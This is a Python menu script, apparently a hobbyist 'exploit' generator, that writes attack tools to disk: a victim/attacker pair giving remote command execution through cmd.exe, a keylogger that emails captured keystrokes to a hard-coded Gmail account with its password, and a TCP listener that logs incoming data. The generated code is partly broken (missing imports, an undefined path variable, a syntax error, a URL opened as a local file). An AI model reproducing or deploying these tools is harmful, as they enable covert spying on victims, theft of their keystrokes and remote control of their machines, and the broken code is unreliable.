import colorama

colorama.init()

print(colorama.Fore.GREEN + """______  _____                   _       _ _   
| ___ \/  ___|                 | |     (_) |  
| |_/ /\ `--.    _____  ___ __ | | ___  _| |_ 
|  __/  `--. \  / _ \ \/ / '_ \| |/ _ \| | __|
| |    /\__/ / |  __/>  <| |_) | | (_) | | |_ 
\_|    \____/   \___/_/\_\ .__/|_|\___/|_|\__|
                         | |                  
                         |_|                  """)


print("")
print(colorama.Fore.MAGENTA + "What do you want to do?")
print("")
print(colorama.Fore.YELLOW + "(1) create a reverse shell with python")
print("")
print(colorama.Fore.YELLOW + "(2) Create a spyware")
print("")
print(colorama.Fore.YELLOW + "(3) Create a script to open tcp ports")
print("")
print(colorama.Fore.RED + "(0) Exit")
print("")
print(colorama.Fore.BLUE)
option = int(input())
print(colorama.Fore.GREEN)
if option == 1:
  print("2 scripts have been created, you have to change the victim ip in each of them after that they will be ready to work")
  archivo = open("victim_shell.py", "w")

  archivo.write("""import socket
import subprocess

server_adress = ("", 5000) #set the victim ip. You can change the port if u want, need to be the same as the atacker script

while True:

  server_socket = socket.socket()
  server_socket.bind(server_adress)
  server_socket.listen(1)

  client_socket, client_address = server_socket.accept()
  command = client_socket.recv(4096).decode()

  if command == "exit":
    client_socket.close()
    break

  result = subprocess.run(f"cmd.exe /c {command}", shell=True,       capture_output=True, text=True)
  exit = result.stdout
  client_socket.send(exit.encode())

  client_socket.close()
  server_socket.close()

#victim script""")

  archivo.close()

  archivo = open("attacker_shell.py", "w")

  archivo.write("""
import socket

server_address = ("", 5000) #set the victim ip. You can change the port if u want, need to be the same as the victim script

while True:
  client_socket = socket.socket()
  client_socket.connect(server_address)

  command_send = input("Command for the victim machine (use shell_help for show the shell options")
  
  if command_send == "exit":
    client_socket.close()
    break

  if command_send == "shell_help"
    print("use exit for stop running commands on the victim machine")
    print()
    print("")


  client_socket.send(command_send.encode())

  answer = client_socket.recv(4096)
  print(answer.decode())
  client_socket.close()

#attacker script""")

  archivo.close()
#IbonS
if option == 0:
  exit()

if option == 2:
  archivo = open("keylogger.py", "w")
  print("Change the email address to yours, the file is created as keylogger.py")
  archivo.write('''
def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WindowName:', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyboardEvent
hooks_manager.HookKeyboard()

def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.read()
        data= data.replace('Space', ' ')
        data = data.replace('\n', '')
        data = 'Mensaje capturado a las: '+ fecha + '\n' + data
        print (data)
        crearEmail('PSmailexploit@gmail.com', 'ps123asd', 'PSmailexploit@gmail.com', 'Nueva captura:' +fecha, data)
        f.seek(0)
        f.truncate()

def crearEmail(user, passw, recep,subj, body):
    import smtplib
    mailUser=user
    mailPass=passw
    From = user
    To = recep
    Subject= subj
    Txt=body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)

    try:
        server=smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Successfully send!!')

    except:
        print('Error sending :(')


   ''')
    
  archivo.close()

if option == 3:
  print("The script is created as tcp_script.py")
  print("")
  print("You need to change the victim ip")
  archivo = open("tcp_script.py", "w")

  archivo.write("""
#!/usr/bin/python3
import socket
mytcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mytcp.bind(('0.0.0.0', 55))
mytcp.listen(1)
connection, addr = mytcp.accept();
print('Connected with ' + addr[0] + ':' + str(addr[1]))
connection.send(b'Connection: OK\n')
file = open('https://d1ny9casiyy5u5.cloudfront.net/tmp/tcplog.txt', 'a')
while True:
 data = connection.recv(1024)
 if not data: break
 print(data.decode())
 file.write(data.decode())
connection.close()
file.close()
  """)

